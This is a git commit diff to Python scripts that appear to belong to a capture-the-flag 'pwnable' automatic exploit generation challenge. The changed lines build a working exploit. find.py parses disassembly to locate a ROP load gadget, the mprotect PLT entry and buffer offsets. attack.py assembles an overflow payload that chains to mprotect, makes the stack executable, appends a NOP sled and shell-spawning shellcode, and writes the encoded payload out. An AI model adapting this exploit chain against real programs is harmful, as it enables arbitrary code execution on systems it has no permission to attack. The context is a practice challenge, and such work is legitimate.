93685e853ae4e6ae615a6f02e5de26fda64cfee2
Rot256 <Rot256@users.noreply.github.com>
2016-03-18 14:07:52 +0000

    More work on AEG

--- pwnable/aeg/attack.py
+++ pwnable/aeg/attack.py
@@ -4,9 +4,11 @@ import find
 import sys
 from pwn import *
 
+context(arch = 'amd64')
+
 tar = sys.argv[1]
 
-# Find dynamic sections in file
+# Find dynamic elements in file
 loc = find.get_addresses(tar)
 
 # Create symbolic buffer
@@ -33,10 +35,67 @@ f = pg.found[0]
 print f.state
 print f.state.se.any_str(buf).encode('hex')
 
+
+# FIXED
+
 # Create killstring
-kill = f.state.se.any_str(buf)
-kill += 'A' * 12
-kill += p64(0x5638d35)
-kill_str = xor(kill, loc['pad'], cut = 'max')
+cert = f.state.se.any_str(buf)
+# cert = '45a64da71bf41084a13d7c2812be721eafc52945ce14815f239b42139e4ff78561cdec4936174ddc288ae81dab39f636'.decode('hex')
+print cert.encode('hex')
+
+mprotect = 0x400790
+overflow = 0x77242B0
+gadget = 0x75229ef
+
+print '%x %x %x' % (mprotect, overflow, gadget)
+
+mprotect = loc['plt_mprotect']
+overflow = loc['buf_loc']
+gadget = loc['load_gadget']
+
+print '%x %x %x' % (mprotect, overflow, gadget)
+
+# kill = '29084d21ca1323f49d00eca94a53af21d7b21f268506c902191f91e253e4f3a07acf448dc2dcde02e481de40ce0df409'.decode('hex')
+
+# Padding up to overflow
+pad2 = 0x200
+shellcode_addr = overflow + pad2
+kill = cyclic(loc['overflow_size'], alphabet = 'ABCD')
+
+# Ret to load gadget with modified RBP
+pad1 = 0x100
+arg_addr = overflow + loc['load_offset'] + pad1
+kill += p64(arg_addr)                            # Set RBP for load gadget
+kill += p64(gadget)                              # Load arguments into registers
+kill += p64(shellcode_addr)
+
+# Prep mprotect arguments
+kill += cyclic(pad1 - len(kill))
+kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
+kill += p64(0x1337)
+kill += p64(0x1337)
+kill += p64(0x1000)                               # RSI
+kill += p64(0x7)                                  # RDX
+
+# Run mprotect
+kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
+kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
+kill += p64(overflow + 0x300)
+kill += p64(mprotect)
+kill += p64(shellcode_addr)
+kill += '\x90' * (pad2 - len(kill))
+kill += asm(shellcraft.sh())
+
+kill_str = xor(cert + kill, loc['pad'], cut = 'max')
+
+write('gdbinit', '''
+        b *0x56381EA
+        b *0x56381F0
+        r
+''')
+write('sploit', kill_str.encode('hex'))
+# p = process([tar, kill_str.encode('hex')])
+
+
 print 'Here is some poison:'
 print kill_str.encode('hex')
--- pwnable/aeg/find.py
+++ pwnable/aeg/find.py
@@ -38,12 +38,30 @@ def get_addresses(path):
     target = re.search('\n(.*)?<memcpy@plt>:', o).group(1)
     res['target'] = int(target, 16)
 
-    # Find pad
+    # Find xor pad
     s = re.search('xor.{0,1024}?.xor.*?\n', o, flags = re.DOTALL).group(0)
     s = re.findall('xor.*?,.*?\n', s)
     s = map(lambda x: x.split(',')[-1], s)
     s = map(lambda x: int(x, 16) % 0xff, s)
     res['pad'] = map(chr, s)
+
+    # Find load gadget
+    s = re.search(hex_rex + ':.*?mov.*?rdi,QWORD PTR \[rbp-0x' + hex_rex, o)
+    res['load_gadget'] = int(s.group(1).strip(), 16)
+    res['load_offset'] = int(s.group(2).strip(), 16)
+    print 'Load gadget = 0x%x' % res['load_gadget']
+    print 'Load offset = 0x%x' % res['load_offset']
+
+    # Find mprotect
+    s = re.search(hex_rex + ' <mprotect@plt>', o).group(1).strip()
+    res['plt_mprotect'] = int(s, 16)
+
+    # Find buffer location
+    s = re.search('ecx,0x' + hex_rex + '.{0,512}rax,\[rbp-0x' + hex_rex + '\].{0,512}<memcpy@plt>', o, flags = re.DOTALL)
+    res['buf_loc'] = int(s.group(1), 16)
+    res['overflow_size'] = int(s.group(2), 16)
+    print 'Buffer location = 0x%x' % res['buf_loc']
+    print 'Buffer overflow size = 0x%x' % res['overflow_size']
 
     print 'Buf = 0x%x' % res['buf']
     print 'Start = 0x%x' % res['start']
